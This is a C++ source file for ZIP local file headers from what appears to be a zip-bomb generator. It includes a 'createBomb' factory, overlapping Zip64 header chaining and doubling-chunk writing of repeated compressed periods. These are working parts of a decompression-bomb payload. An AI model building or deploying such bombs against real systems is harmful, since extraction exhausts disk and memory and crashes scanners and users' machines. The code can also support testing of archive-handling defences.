//
// Created by LeeEeZian on 9/9/2026.
//
#include "zip_file_construction/LocalFileHeader.h"

#include "factory/PayloadFactory.h"
#include "Helper.h"
#include "zip_file_construction/Zip64.h"
#include "Timer.h"
#include "deflation/BitWriter.h"

#include <span>



namespace {
    void repeatInPlace(std::vector<uint8_t> &vector, const size_t n, const std::optional<size_t>targetSize=std::nullopt) {
        const size_t originalSize{vector.size()};
        if (targetSize.has_value()) {
            vector.reserve(targetSize.value());

        }
        vector.resize(vector.size() * n);


        size_t filledSize{originalSize};
        while (filledSize < vector.size()) {
            std::copy_n(vector.begin(), originalSize, vector.begin() + static_cast<long long>(filledSize));
            filledSize += originalSize;
        }
    }
    //
    // size_t sumTo(const size_t firstValue, const size_t lastValue, const size_t totalInterval) {
    //     return (totalInterval* (firstValue+lastValue)/2);
    // }

}


LocalFileHeader::LocalFileHeader(FileHeaderConstructConfig &config) : version_{config.version},
                                                                      flags_{config.flags},
                                                                      compressionMethod_{
                                                                          config.compressionMethod
                                                                      },
                                                                      modTime_{config.modTime},
                                                                      modDate_{config.modDate},
                                                                      compressedSize_{config.compressedSize},
                                                                      uncompressedSize_{config.uncompressedSize},
                                                                      fileName_{config.fileName},
                                                                      bombRecipe_{config.bombRecipe},
                                                                      data_(std::move(config.data)) {
    if (config.crc32.has_value()) {
        crc32_ = config.crc32.value();
    } else {
        Crc32 crc{};
        for (const uint8_t &byte: data_) {
            crc.update(byte);
        }
        crc.computeCrc32();
        crc32_ = crc;
    }
}

size_t LocalFileHeader::serializeTo(std::ofstream &out) {
    using namespace helper;

    std::vector<uint8_t> serialized {getHeaderBytes()};

    size_t size{serialized.size()};

    writeFile(out, serialized);


    if (!bombRecipe_.has_value()) {
        Timer lfhWrite{"Writing lfh data"};
        writeFile(out, data_);
        size += data_.size();
    }
    else{
        Timer lfhWrite{"Writing lfh bomb data"};

        size += bombRecipe_->start.size();
        writeFile(out, bombRecipe_->start);

        size_t periodSize{bombRecipe_->period.size()};

        constexpr size_t maxChunkSize{256 * static_cast<size_t>(ByteSize::MB)};

        std::vector<uint8_t> chunkData{bombRecipe_->period};
        size_t writeSize{chunkData.size()};
        while (bombRecipe_->numberOfPeriods) {
            if (bombRecipe_->numberOfPeriods & 1) {
                size += periodSize;
                writeXChunk(out,chunkData,writeSize);
            }

            bombRecipe_->numberOfPeriods >>= 1;
            periodSize *= 2;

            if (chunkData.size()*2 < maxChunkSize) {
                repeatInPlace(chunkData, 2,maxChunkSize);
            }
            writeSize*=2;
        }
        size += bombRecipe_->end.size();

        writeFile(out, bombRecipe_->end);
    }

    return size;
}

LocalFileHeader LocalFileHeader::createStored(std::string fileName, std::string data) {
    FileHeaderConstructConfig config{};
    config.version = static_cast<uint16_t>(Version::ORIGINAL);
    config.flags = 0;
    config.compressionMethod = static_cast<uint16_t>(Compression::STORED);
    config.modTime = 0;
    config.modDate = 0;

    config.compressedSize = static_cast<uint32_t>(data.size());
    config.uncompressedSize = static_cast<uint32_t>(data.size());
    config.fileName.assign(fileName.begin(), fileName.end());

    config.data.assign(data.begin(), data.end());

    return LocalFileHeader{config};
}

LocalFileHeader LocalFileHeader::createBomb(std::string fileName, const size_t size) {
    auto [recipe,uncompressedSize,compressedSize,crc32]{payloadFactory::createDynamicBombPayload(size)};
    FileHeaderConstructConfig config{};


    if (uncompressedSize >= 0xFFFFFFFFULL || compressedSize >= 0xFFFFFFFFULL) {
        config.version = static_cast<uint16_t>(Version::ZIP64);
    } else {
        config.version = static_cast<uint16_t>(Version::DEFLATE);
    }
    config.flags = 0;
    config.compressionMethod = static_cast<uint16_t>(Compression::DEFLATE);
    config.modTime = 0;
    config.modDate = 0;

    config.compressedSize = compressedSize;
    config.uncompressedSize = uncompressedSize;
    config.fileName.assign(fileName.begin(), fileName.end());

    config.crc32 = crc32;
    config.bombRecipe = recipe;


    return LocalFileHeader{config};
}

LocalFileHeader LocalFileHeader::createBasic(std::string fileName, std::vector<uint8_t> &&compressedData,
                                             const size_t compressedSize, const size_t uncompressedSize,Crc32 crc32) {
    FileHeaderConstructConfig config{};

    if (uncompressedSize >= 0xFFFFFFFFULL || compressedSize >= 0xFFFFFFFFULL) {
        config.version = static_cast<uint16_t>(Version::ZIP64);
    } else {
        config.version = static_cast<uint16_t>(Version::DEFLATE);
    }
    config.flags = 0;
    config.compressionMethod = static_cast<uint16_t>(Compression::DEFLATE);
    config.modTime = 0;
    config.modDate = 0;

    config.compressedSize = compressedSize;
    config.uncompressedSize = uncompressedSize;
    config.fileName.assign(fileName.begin(), fileName.end());
    config.data = std::move(compressedData);
    config.crc32 = crc32;

    return LocalFileHeader{config};
}

LocalFileHeader LocalFileHeader::createNonFinalZip64(UniqueNameGenerator& nameGenerator, const LocalFileHeader& priorFileHeader) {
    FileHeaderConstructConfig config{};

    std::string fileName{nameGenerator.createName()};

    const std::vector<uint8_t> priorHeaderBytes{priorFileHeader.getHeaderBytes()};

    Crc32 crc {};

    for (const auto& bytes : priorHeaderBytes) {
        crc.update(bytes);
    }
    crc.computeCrc32();
    crc.combine(priorFileHeader.getCrc32Object());

    BitWriter writer{};
    writer.add(HuffmanTable::BFINAL::NO, 1);
    writer.add(HuffmanTable::BTYPE::STORED, 2);
    writer.alignToByte();

    const uint16_t len{static_cast<uint16_t>(priorHeaderBytes.size())};
    writer.add(len,16);
    writer.add(~len & 0xFFFF,16);

    constexpr size_t headerOverhead {5};

    const size_t compressedSize {priorFileHeader.getCompressedSize()+len+headerOverhead};
    const size_t unCompressedSize {priorFileHeader.getUncompressedSize()+len};

    if (unCompressedSize >= 0xFFFFFFFFULL || compressedSize >= 0xFFFFFFFFULL) {
        config.version = static_cast<uint16_t>(Version::ZIP64);
    } else {
        config.version = static_cast<uint16_t>(Version::DEFLATE);
    }

    config.flags = 0;
    config.compressionMethod = static_cast<uint16_t>(Compression::DEFLATE);
    config.modTime = 0;
    config.modDate = 0;

    config.compressedSize = compressedSize;
    config.uncompressedSize = unCompressedSize;
    config.fileName.assign(fileName.begin(), fileName.end());
    config.data = writer.release();

    config.crc32 = crc;

    return LocalFileHeader{config};
}

std::vector<uint8_t> LocalFileHeader::getHeaderBytes() const{
    using namespace helper;

    std::vector<uint8_t> headerBytes;
    headerBytes.reserve(30);

    appendBytes32Small(headerBytes, signature);
    appendBytes16Small(headerBytes, version_);
    appendBytes16Small(headerBytes, flags_);
    appendBytes16Small(headerBytes, compressionMethod_);
    appendBytes16Small(headerBytes, modTime_);
    appendBytes16Small(headerBytes, modDate_);

    appendBytes32Small(headerBytes, crc32_.getCrc32());
    Zip64ExtraBlock extraField{};

    const bool useZip64 = (uncompressedSize_ >= 0xFFFFFFFFULL || compressedSize_ >= 0xFFFFFFFFULL);
    if (useZip64) {
        appendBytes32Small(headerBytes, 0xFFFFFFFF);
        appendBytes32Small(headerBytes, 0xFFFFFFFF);
        extraField.id = Zip64ExtraBlock::ZIP64_EXTENDED_INFO;
        appendBytes64Small(extraField.data, uncompressedSize_);
        appendBytes64Small(extraField.data, compressedSize_);
    } else {
        appendBytes32Small(headerBytes, compressedSize_);
        appendBytes32Small(headerBytes, uncompressedSize_);
    }


    appendBytes16Small(headerBytes, static_cast<uint16_t>(fileName_.size()));
    appendBytes16Small(headerBytes, static_cast<uint16_t>(extraField.size()));

    headerBytes.insert(headerBytes.end(), fileName_.begin(), fileName_.end());

    if (useZip64) {
        std::vector<uint8_t> serializedExtraField{extraField.serialize()};
        headerBytes.insert(headerBytes.end(), serializedExtraField.begin(), serializedExtraField.end());
    }

    return headerBytes;
}

